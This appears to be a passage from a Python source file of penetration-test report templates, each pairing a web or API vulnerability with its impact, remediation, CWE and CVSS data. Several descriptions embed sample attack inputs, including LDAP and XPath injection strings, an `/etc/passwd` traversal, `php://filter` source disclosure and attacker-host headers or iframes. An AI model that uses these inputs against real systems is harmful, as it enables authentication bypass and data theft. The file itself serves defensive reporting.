            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "LDAP Injection", "High",
            description="The directory-search endpoint constructs the LDAP filter via string concatenation: `(&(uid={user})(password={pass}))`. Submitting `user=*)(uid=*))(|(uid=*` causes the resulting filter to match every account; `pass=*` then authenticates as the first match — typically the first user in the OU, often a privileged service account.",
            impact="Authentication bypass; enumeration of directory attributes; in misconfigured deployments, write-access to directory entries (modify membership of administrative groups).",
            remediation="- Use a parameterised LDAP query API instead of string concatenation: `unboundid SearchRequest` (Java), `ldap3 Connection.search(search_filter=…, search_base=…)` with escaped values (Python).\n- Escape all special LDAP filter characters per RFC 4515 (`\\`, `*`, `(`, `)`, `\\0`).\n- Bind to LDAP as a low-privilege service account; never use directory-admin credentials.",
            references="https://owasp.org/www-community/attacks/LDAP_Injection\nhttps://cwe.mitre.org/data/definitions/90.html",
            cwe="CWE-90", owasp="A03:2021",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "XPath Injection", "Medium",
            description="The application searches an XML-backed user store via an XPath expression built with string concatenation: `//user[username='{u}' and password='{p}']`. Submitting `u=' or '1'='1` causes the filter to match every node.",
            impact="Authentication bypass on the affected endpoint and unauthorised retrieval of XML node values. Some implementations expose `XPath 2.0`'s `doc()` function — an attacker can read arbitrary files on the server.",
            remediation="- Parameterise XPath via `XPathExpression.setVariable()` (Java) / `etree.XPath` with `variables=` (Python lxml).\n- Reject any input containing single quotes, square brackets, or XPath operators before it reaches the expression.\n- Consider migrating the underlying store to a database with a properly parameterised query layer.",
            references="https://owasp.org/www-community/attacks/XPATH_Injection\nhttps://cwe.mitre.org/data/definitions/643.html",
            cwe="CWE-643", owasp="A03:2021",
            cvss_score=6.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "CRLF Injection / HTTP Response Splitting", "Medium",
            description="A user-controlled value is reflected into an HTTP response header without filtering for `\\r\\n` sequences. Submitting `?lang=en%0d%0aSet-Cookie:%20admin=1` injects a forged `Set-Cookie` header into the response. On older / mis-tuned servers (Apache 1.x, IIS 6, some embedded HTTP stacks) the trailing `\\r\\n\\r\\n` enables full HTTP response splitting — the attacker controls the body of a second response that the client sees as the legitimate one.",
            impact="Cache poisoning of intermediate proxies, session fixation via injected `Set-Cookie`, defacement of cached pages, and on classic response-splitting cases, XSS without any browser-side JavaScript execution required.",
            remediation="- Reject CR and LF (`\\r`, `\\n`) in any value flowing into an HTTP header.\n- Use the framework's typed header-setting API (`response.setHeader(name, value)`) rather than concatenating strings.\n- Upgrade fronting HTTP servers to versions that refuse to forward CRLF in header values.",
            references="https://owasp.org/www-community/attacks/CRLF_Injection\nhttps://cwe.mitre.org/data/definitions/93.html",
            cwe="CWE-93", owasp="A03:2021",
            cvss_score=5.9,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Host Header Injection / Password Reset Poisoning", "Medium",
            description="The application trusts the inbound `Host:` header when constructing absolute URLs (typically inside password-reset links sent by email). An attacker sending `Host: attacker.tld` triggers the legitimate flow but the email arrives with `https://attacker.tld/reset?token=…` — when the victim clicks, the token leaks to the attacker.\n\nVariant: `X-Forwarded-Host: attacker.tld` works on deployments that trust XFH unconditionally.",
            impact="Account takeover. The victim never sees a malicious link being constructed; only the password reset that they themselves requested. The token leaks to whoever controls `attacker.tld`.",
            remediation="- Construct absolute URLs from a server-side allow-list of canonical hostnames, not from the request's `Host` header.\n- If you must read `Host`, validate it against an allow-list before using it.\n- For reverse-proxy setups, disable `X-Forwarded-Host` unless you explicitly need it AND verify the proxy strips client-supplied values.",
            references="https://portswigger.net/web-security/host-header\nhttps://owasp.org/www-community/attacks/Cache_Poisoning",
            cwe="CWE-640", owasp="A01:2021",
            cvss_score=6.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Web Cache Poisoning via Unkeyed Header", "High",
            description="The CDN / reverse-proxy keys its cache on `(method, host, path, query)` but the origin reflects an unkeyed header (`X-Forwarded-Host`, `X-Original-URL`, `User-Agent`) into the response body. Submitting `GET / HTTP/1.1\\r\\nX-Forwarded-Host: evil.tld\\r\\n…` causes the origin to render an absolute URL pointing at `evil.tld`, and the CDN caches that response for every subsequent visitor on that key.",
            impact="One-shot defacement / phishing of the affected URL for every visitor until the cache expires. If the reflected value lands inside a `<script src>` or similar, escalates to stored XSS for every cached viewer.",
            remediation="- Identify every header / cookie / parameter the origin reflects into the response body, and either: (a) strip the header at the CDN before forwarding to origin, or (b) include the value in the cache key.\n- Disable reflection of `X-Forwarded-Host` / `X-Original-URL` / `Forwarded` unless they're explicitly part of your URL canonicalisation.\n- Set a short `Cache-Control: max-age=0, private` on responses that contain reflected user input.",
            references="https://portswigger.net/research/practical-web-cache-poisoning\nhttps://owasp.org/www-community/attacks/Cache_Poisoning",
            cwe="CWE-444", owasp="A04:2021",
            cvss_score=7.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:L/SI:L/SA:N"),

        _f("web_vapt", "Web Cache Deception", "Medium",
            description="The application serves authenticated content at `/account/profile`. The CDN is configured to cache any URL ending in a static-asset extension. Requesting `/account/profile/nonexistent.css` causes the origin to return the user's profile page (path-handling routes /account/profile/* to the profile controller); the CDN then caches the response as if it were a CSS file. A second visitor requesting the same URL gets the first user's profile from cache.",
            impact="Cross-user data leak: any authenticated content the application serves is exposed by appending a static-looking extension to the URL and tricking a victim into requesting it.",
            remediation="- The origin must NOT serve authenticated content under URLs that look like static assets. Reject `/account/profile/*.css` (etc.) with a 404 at the application level.\n- Configure the CDN to honour the origin's `Cache-Control: private` AND only cache documents with `Content-Type` matching static-asset types.\n- Make cache decisions on response headers, not URL extension.",
            references="https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html\nhttps://owasp.org/www-community/attacks/Cache_Poisoning",
            cwe="CWE-525", owasp="A01:2021",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Insecure CORS Misconfiguration (Origin Reflection / Wildcard with Credentials)", "High",
            description="The application reflects the request's `Origin` header back as `Access-Control-Allow-Origin` AND sets `Access-Control-Allow-Credentials: true`. From any origin, a script can issue a `XMLHttpRequest` with credentials to the target's authenticated endpoints and read the response.\n\nAlternative misconfiguration: `Access-Control-Allow-Origin: null` + credentials — a sandboxed iframe / data: URL triggers `Origin: null` and bypasses the same-origin policy.",
            impact="Cross-origin theft of authenticated data. An attacker page hosted anywhere on the Internet can read the victim's API responses (account profile, token, internal data) as if it were running on the legitimate origin.",
            remediation="- Maintain an explicit allow-list of allowed origins; compare exact-match before echoing into `Access-Control-Allow-Origin`.\n- Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers refuse, but origin-reflection is just as bad).\n- Treat `null` as a value that must NEVER appear in the allow-list.\n- For public, non-credentialed APIs, `Access-Control-Allow-Origin: *` alone is acceptable.",
            references="https://portswigger.net/web-security/cors\nhttps://cwe.mitre.org/data/definitions/942.html",
            cwe="CWE-942", owasp="A05:2021",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Local File Inclusion (LFI) / Path Traversal", "High",
            description="A `file` / `template` / `lang` parameter is passed to a file-loading sink without canonicalisation. `GET /viewer?page=../../../../etc/passwd%00` returns the contents of `/etc/passwd`. On PHP, `php://filter/convert.base64-encode/resource=index` returns the application's own source code base64-encoded.",
            impact="Direct read of any file the application's process can access — source code, configuration with credentials, OS files. On PHP / older Java, escalates to RCE via log-poisoning or session-file inclusion.",
            remediation="- Never concatenate user input into a filesystem path. Use an allow-list of permitted page identifiers that map to internal paths.\n- Canonicalise paths (`os.path.realpath` / Java `Path.normalize().toAbsolutePath()`) and verify the result starts with the expected base directory.\n- Strip null bytes (`\\x00`) at the request boundary — old PHP versions truncate paths at `\\x00`, sidestepping extension checks.",
            references="https://owasp.org/www-community/attacks/Path_Traversal\nhttps://cwe.mitre.org/data/definitions/22.html",
            cwe="CWE-22", owasp="A01:2021",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Clickjacking (Missing Frame Protection)", "Low",
            description="The application's pages can be loaded inside an iframe on any origin. Neither `X-Frame-Options: DENY` / `SAMEORIGIN` nor `Content-Security-Policy: frame-ancestors 'self'` is emitted on sensitive pages (transfer funds, change password, manage permissions).\n\nProof: a one-line HTML page at `evil.tld` containing `<iframe src=\"https://app.example.com/account/delete\"></iframe>` renders the page successfully.",
            impact="UI redress attack: an attacker overlays a transparent iframe on a malicious page; the victim's clicks intended for the attacker's UI are forwarded to the target application — confirming destructive actions (delete account, transfer money, grant OAuth scope) without realising it.",
            remediation="- Emit `Content-Security-Policy: frame-ancestors 'self'` on every page (preferred — works in modern browsers AND obsoletes XFO).\n- Keep `X-Frame-Options: DENY` (or `SAMEORIGIN`) for older browsers that don't implement CSP frame-ancestors.\n- For pages that genuinely need to be embedded (widgets), keep an allow-list of partner origins.",
            references="https://owasp.org/www-community/attacks/Clickjacking\nhttps://cwe.mitre.org/data/definitions/1021.html",
            cwe="CWE-1021", owasp="A05:2021",
            cvss_score=4.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N"),

        _f("web_vapt", "HTTP Parameter Pollution (HPP)", "Low",
            description="The backend processes duplicate query / form parameters inconsistently. `?role=user&role=admin` is interpreted by the web framework as `[\"user\",\"admin\"]` while a downstream WAF / SSO module sees only the first occurrence (`user`) and lets the request through. The application then uses the second occurrence (`admin`) when assigning the user role.",
            impact="Bypass of access-control / WAF rules wherever the policy layer and the application layer disagree on which duplicate wins. Severity depends entirely on what the attacker can sneak past the policy layer.",
            remediation="- Standardise how every layer handles duplicate parameters — pick one rule (first / last / array) and enforce it across the entire stack.\n- Reject requests containing duplicate parameters where uniqueness is expected at the application boundary.\n- WAFs / API gateways should normalise the request before policy evaluation.",
            references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\nhttps://cwe.mitre.org/data/definitions/235.html",
            cwe="CWE-235",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Race Condition / TOCTOU on Critical Action", "High",
            description="The voucher-redemption endpoint reads the user's voucher balance, decrements by N if balance >= N, and writes the new balance — without a transactional lock. Issuing 50 parallel `POST /api/voucher/redeem` requests with a single $100 voucher triggers the race; the server-side balance ends at $-4900 and 50 voucher uses are credited to the attacker.\n\nSame pattern observed on coupon-use, password-reset-token consumption, and 2FA-attempt counters.",
            impact="Financial loss (coupon stacking, balance underflow), authentication bypass (re-using a one-time token N times before the first race finishes), and 2FA brute force (the failed-attempt counter never increments when N attempts race past the read).",
            remediation="- Wrap read-modify-write sequences in a database transaction with `SELECT … FOR UPDATE` or equivalent row-level lock.\n- Use atomic compare-and-swap operations (`UPDATE … SET balance = balance - N WHERE balance >= N`).\n- For 2FA / one-time tokens, mark them consumed in the same SQL statement that validates them.\n- For distributed systems, use a centralised lock (Redis SETNX with TTL, ZooKeeper, DB advisory locks).",
            references="https://owasp.org/www-community/attacks/Race_Condition\nhttps://portswigger.net/research/smashing-the-state-machine",
            cwe="CWE-362", owasp="A04:2021",
            cvss_score=8.0,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "OAuth 2.0 — Missing or Predictable State Parameter", "Medium",
            description="The OAuth 2.0 authorisation flow either omits the `state` parameter entirely or uses a predictable value (a timestamp, a low-entropy counter, the username). An attacker initiating their own OAuth flow, intercepting the resulting authorisation code, and tricking the victim into visiting `https://app/oauth/callback?code=<attacker_code>&state=<predicted>` causes the victim's account to be linked to the attacker's IdP identity.",
            impact="Account takeover via OAuth — once linked, the attacker logs in with their IdP credentials and lands on the victim's account.",
            remediation="- Generate `state` as ≥ 128 bits of CSPRNG output per-flow.\n- Bind `state` to the user's pre-authentication session; on callback, verify the returned `state` matches the value the session started.\n- Reject callbacks where `state` is missing.\n- Additionally implement PKCE (`code_challenge` / `code_verifier`) for the same flow — defence in depth against code-interception.",
            references="https://datatracker.ietf.org/doc/html/rfc6749#section-10.12\nhttps://datatracker.ietf.org/doc/html/rfc7636",
            cwe="CWE-352", owasp="A07:2021",
            cvss_score=6.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "SAML — Signature Wrapping / Comment-Truncation Bypass", "Critical",
            description="The SAML Service Provider validates the digital signature of the inbound assertion but reads identity attributes from a different XML node than the one covered by the signature (the classic XSW1-XSW8 attacks). Alternately, the SP's identity parser truncates the `NameID` at the first XML comment, so `<NameID>victim@org.tld<!---->@attacker.tld</NameID>` is authenticated as `victim@org.tld` despite the IdP issuing the assertion to `…@attacker.tld`.",
            impact="Authentication bypass — an attacker with any valid IdP account at the federated identity provider can impersonate any user at the affected SP, including administrators.",
            remediation="- Use a maintained SAML library (python3-saml, OneLogin SAML toolkits, java-saml) and keep it patched — the known XSW + comment-truncation bypasses are fixed in current releases.\n- Verify the signature covers the *exact* XML node from which you read identity attributes (StrictValidation mode).\n- Normalise / reject XML comments inside identity-bearing elements before parsing.",
            references="https://www.cs.bham.ac.uk/~smm/papers/SAML.pdf\nhttps://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations\nhttps://cwe.mitre.org/data/definitions/347.html",
            cwe="CWE-347", owasp="A02:2021",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Subdomain Takeover (Dangling DNS to Cloud Service)", "High",
            description="The DNS record `legacy.app.example.com` CNAMEs to a cloud service (S3 bucket `legacy-app.s3.amazonaws.com`, Heroku app, Azure Web App, GitHub Pages) that was deleted by the service owner but where the DNS record was forgotten. Anyone can register the same name on the cloud provider and serve arbitrary content from `legacy.app.example.com`.",
            impact="Trusted-origin content takeover. The attacker now controls a hostname that's in the organisation's domain, enabling cookie-based session theft for cookies scoped to `.example.com`, phishing campaigns that look legitimate, and bypass of CSPs allow-listing `*.example.com`.",
            remediation="- Inventory every CNAME / A record pointing at a cloud-managed hostname. For each, verify the target still exists.\n- Implement domain-takeover detection in DNS automation (subjack, can-i-take-over-xyz scanner) as a periodic CI check.\n- When deprovisioning cloud resources, remove the DNS record as part of the same change.",
            references="https://github.com/EdOverflow/can-i-take-over-xyz\nhttps://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover",
            cwe="CWE-1385",
            cvss_score=7.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["infra_vapt"]),

        _f("web_vapt", "WebSocket — Missing Origin Validation (CSWSH)", "High",
            description="The application's WebSocket endpoint accepts upgrade requests without validating the `Origin` header. A page at `https://evil.tld` can call `new WebSocket('wss://app.example.com/ws')` and the connection is upgraded with the victim's cookies attached.",
            impact="Cross-Site WebSocket Hijacking — an attacker hosts a page that opens a WebSocket to the target on behalf of any logged-in victim who visits it. Subsequent messages are sent as the victim and the responses are readable by the attacker's JavaScript.",
            remediation="- Verify `Origin` on every WebSocket upgrade request against an allow-list of the application's known origins.\n- For ws/wss endpoints that intend to be cross-origin, require a CSRF-style token in the first message AND verify it server-side before treating the connection as authenticated.\n- Don't rely on cookies for WebSocket authentication — use a bearer token in the URL (over wss) or in the first frame.",
            references="https://portswigger.net/web-security/websockets\nhttps://cwe.mitre.org/data/definitions/1385.html",
            cwe="CWE-1385", owasp="A05:2021",
            cvss_score=7.8,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),
    ])

    # ---- Web — information disclosure / configuration --------------
    F.extend([
        _f("web_vapt", "Directory Listing Enabled", "Low",
            description="Requesting a directory URL without an `index.*` file returns the auto-generated directory index — the web server (nginx `autoindex on`, Apache `Options +Indexes`, IIS Directory Browsing) lists every file and folder. Sensitive examples observed: `/uploads/` exposes every user's avatar by filename, `/backup/` reveals `2024-12-prod.sql.gz`.",
            impact="Information disclosure ranging from enumeration aid (knowing which files to fuzz) to direct exposure (any backup, log, or temp file silently dropped into a web-served directory is now downloadable by anyone).",
            remediation="- Disable directory indexing globally:\n  - nginx: ensure `autoindex off;` (default).\n  - Apache: remove `Indexes` from `Options` in every `<Directory>` block.\n  - IIS: turn off Directory Browsing in IIS Manager.\n- Place an empty `index.html` in directories that should silently 403/404.\n- Move static-serving paths outside the web root for upload / backup / log directories.",
            references="https://cwe.mitre.org/data/definitions/548.html\nhttps://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information",
            cwe="CWE-548", owasp="A05:2021",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_vapt", "infra_va"]),

        _f("web_vapt", "Sensitive Information in Backup / Temporary Files", "Medium",
            description="Backup files and editor temp files are served by the production web server without authentication: `/config.php.bak`, `/database.sql.gz`, `/.env`, `/.env.local`, `/web.config.bak`, `/composer.json`, `/.git/config`, `/.svn/entries`, `/index.php~`. Several of them contain production database credentials.",
            impact="Direct exposure of secrets, source code, and infrastructure topology. Stolen DB credentials and `.git` history are typically the fastest path to full compromise.",
            remediation="- Add a deny rule on the web server for known sensitive patterns: `~$`, `\\.bak$`, `\\.swp$`, `\\.orig$`, `^\\.env`, `^\\.git/`, `^\\.svn/`.\n- Keep backups outside the web root. Use a deploy step that explicitly excludes editor temp files.\n- Audit the production webroot periodically with a scanner (Nikto, Burp's `discover content`, or `dirsearch`).",
            references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information\nhttps://cwe.mitre.org/data/definitions/530.html",
            cwe="CWE-530", owasp="A05:2021",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Sensitive Data in URL / GET Query String", "Low",
            description="The application places session tokens, password-reset tokens, OTPs, or PII in URL query strings. `https://app.example.com/reset?token=abc123` triggers logging of the token in:\n- The reverse-proxy access log (long retention)\n- The user's browser history and `Referer` headers to third-party assets (analytics, CDN, share buttons)\n- Any monitoring tool inspecting URLs",
            impact="A token that leaks via a Referer to a third party is fully usable until expiry. Browser-history exposure compromises the token on shared / kiosk devices. Access-log leaks are an insider threat AND a backup-exfiltration risk.",
            remediation="- Pass tokens in the request BODY (`POST`) or in a `Authorization` header, never the URL.\n- Strip `Referer` on sensitive pages: `Referrer-Policy: no-referrer` (or `strict-origin-when-cross-origin`).\n- If a token MUST appear in the URL (e.g. an emailed reset link), make it single-use and short-lived (< 15 minutes), and rotate the user's session after redemption.",
            references="https://cwe.mitre.org/data/definitions/598.html\nhttps://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url",
            cwe="CWE-598",
            cvss_score=4.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Forced Browsing — Unauthenticated Privileged Endpoint", "High",
            description="The administrative interface at `/admin/users` is not linked from any non-admin page and the UI hides the navigation entry from non-admins — but the URL itself is accessible without authentication or with a low-privilege session. Directly browsing the URL renders the full user-management page.",
            impact="Privilege escalation: any anonymous / low-privilege visitor who guesses (or scrapes via Wayback / Google) the URL gets full admin functionality.",
            remediation="- Enforce authorization at the route handler, not via UI presence. Every privileged route MUST verify the session AND the role before serving.\n- Use a central authorization middleware so a new admin page can't accidentally be left unprotected.\n- Add an integration test: assert every `/admin/*` endpoint returns 401/403 for an anonymous request and 403 for a non-admin authenticated request.",
            references="https://owasp.org/www-community/attacks/Forced_browsing\nhttps://cwe.mitre.org/data/definitions/425.html",
            cwe="CWE-425", owasp="A01:2021",
            cvss_score=8.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Sensitive Cookie Missing 'Secure' Attribute", "Low",
            description="The session cookie / auth cookie is set without the `Secure` attribute. A user who briefly loads any HTTP URL on the same host (or any cookie-scope-matching host) leaks the cookie value in cleartext over the network.",
            impact="On networks where TLS-stripping or HTTP-fallback is possible (open Wi-Fi, malicious captive portal, hostile ISP), an attacker passively captures session cookies and reuses them to log in as the victim.",
            remediation="- Set `Secure` on every cookie carrying authentication, session, or sensitive state.\n- Pair with `HttpOnly` and `SameSite=Lax` (or `Strict`).\n- Serve `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` so the browser never makes plaintext requests.",
            references="https://cwe.mitre.org/data/definitions/614.html",
            cwe="CWE-614", owasp="A02:2021",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Sensitive Cookie Missing 'SameSite' Attribute", "Low",
            description="The session cookie has no `SameSite` attribute. The browser's default (`Lax` on modern Chrome / Firefox / Edge; nothing on older browsers and on Safari pre-iOS 16) leaves cookie-only-authenticated endpoints exposed to CSRF on browsers that haven't moved to default-Lax yet.",
            impact="Drives CSRF risk on every state-changing endpoint that relies solely on cookie authentication, regardless of whether a dedicated CSRF token is in place. Severity is low on modern browsers (default Lax already prevents the worst-case) but elevated for engagements that must support older clients.",
            remediation="- Set `SameSite=Lax` (default for most apps) or `SameSite=Strict` (for highly sensitive flows) on every cookie.\n- `SameSite=None` is allowed only on cookies that genuinely need cross-site use (embed widgets, federated identity) AND it must be paired with `Secure`.\n- Combine SameSite with a CSRF token / `Origin` check for defence in depth.",
            references="https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis\nhttps://cwe.mitre.org/data/definitions/1275.html",
            cwe="CWE-1275", owasp="A05:2021",
            cvss_score=3.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Subresource Integrity (SRI) Missing on Third-Party Scripts", "Low",
            description="The application loads JavaScript from a third-party CDN without a `subresource integrity` hash: `<script src=\"https://cdn.example.com/lib.js\"></script>`. If the CDN is compromised (or the asset is silently swapped by a malicious supply-chain update) the browser will execute the modified script with full DOM access on the page.",
            impact="Effective remote-code execution in every visitor's browser if the third-party domain is ever compromised. Major historic incidents (e.g. the 2018 BrowseAloud / Inkfilepicker injection) hit thousands of sites this way.",
            remediation="- Self-host critical dependencies and pin them by version in your build pipeline.\n- Where a CDN is genuinely needed, attach an SRI hash: `<script src=\"…\" integrity=\"sha384-…\" crossorigin=\"anonymous\"></script>`.\n- Maintain a CSP `script-src 'self' cdn.example.com` to limit blast radius.",
            references="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\nhttps://cwe.mitre.org/data/definitions/829.html",
            cwe="CWE-829",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"),

        _f("web_vapt", "Browser Cache Containing Sensitive Information", "Low",
            description="Pages displaying sensitive data (account balance, password-reset confirmation, KYC documents) are served without cache-prevention headers. Default browser / proxy behaviour caches the response. On a shared / kiosk / family device, pressing Back after the user logs out renders the cached sensitive page from disk.",
            impact="Sensitive content exposed to a subsequent user of the same device. PCI-DSS / HIPAA / PDPA audits frequently flag this.",
            remediation="- Emit `Cache-Control: no-store` on every page rendering sensitive data.\n- Pair with `Pragma: no-cache` for very old proxies.\n- Optionally invalidate the back-button history on logout via a server-side redirect chain that the browser can't return to.",
            references="https://cwe.mitre.org/data/definitions/525.html",
            cwe="CWE-525",
            cvss_score=3.1,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Server / Framework Banner Disclosure", "Informational",
            description="Responses include verbose `Server:` and `X-Powered-By:` headers: `Server: Apache/2.4.41 (Ubuntu)`, `X-Powered-By: PHP/7.4.3`. The version values are precise enough to look up known CVEs against.",
            impact="Pure information disclosure. By itself it doesn't grant access, but it accelerates the targeting of exploits at the specific versions in use. Defence-in-depth value of removal is to slow down attackers, not to prevent compromise.",
            remediation="- Apache: `ServerTokens Prod` and `ServerSignature Off`.\n- nginx: `server_tokens off;`.\n- PHP: `expose_php = Off` in `php.ini`.\n- For application frameworks (Django, Spring, .NET), remove or rewrite `X-Powered-By` at the reverse-proxy layer.",
            references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage",
            cwe="CWE-200",
            cvss_score=0.0,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("api_vapt", "Broken Object Level Authorization (BOLA)", "High",
            description="The endpoint `GET /api/v1/orders/{order_id}` authenticates the caller but does not verify that `order_id` belongs to the caller's account. An attacker iterating `order_id` from 1 upwards retrieves every order in the system.",
            impact="The OWASP API #1 finding for a reason — at scale, BOLA exposes every record the API serves. For a marketplace / financial API this is full customer-data exfiltration.",
            remediation="- At every API handler, re-derive resource ownership from the authenticated principal AND the requested id. Never trust the id alone.\n- Use a centralised authorization framework (Cancan-style abilities, Oso, OPA) so a new endpoint can't accidentally be left ungated.\n- UUIDs over auto-incrementing integers slow enumeration but are not a security control on their own.\n- Integration test: every privileged endpoint, called with another user's resource id, must return 403/404 and emit zero data.",
            references="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/\nhttps://cwe.mitre.org/data/definitions/639.html",
            cwe="CWE-639", owasp="API1:2023",
            cvss_score=8.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("api_vapt", "Broken Function Level Authorization (BFLA)", "High",
            description="The administrative endpoint `DELETE /api/v1/users/{id}` is invoked successfully by a low-privilege user — the route only checks `is_authenticated`, not `is_admin`. The admin UI hides the action from non-admins, but the URL itself accepts any authenticated caller.",
            impact="Privilege escalation: any authenticated user can perform admin-only actions — user deletion, role grants, policy changes — entirely through API calls.",
            remediation="- Enforce role / scope checks at every privileged route, not in the UI.\n- Adopt a deny-by-default authorisation framework where every route must explicitly declare what permission it requires.\n- Add automated tests covering the matrix `(role × endpoint)` to surface unprotected admin routes.",
            references="https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/\nhttps://cwe.mitre.org/data/definitions/285.html",
            cwe="CWE-285", owasp="API5:2023",
            cvss_score=8.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["web_vapt"]),

        _f("api_vapt", "Excessive Data Exposure in API Response", "Medium",
            description="The endpoint `GET /api/v1/users/{id}` returns the full database row — including `password_hash`, `mfa_secret`, `internal_admin_notes`, and `password_reset_token`. The frontend filters which fields to render, so the disclosure is not visible in normal app usage. A direct API consumer sees everything.",
            impact="Sensitive material that should never leave the backend (password hashes, MFA secrets, reset tokens) is returned to anyone with API access. Hashes enable offline cracking; reset tokens enable account takeover; MFA secrets enable bypass of the second factor.",
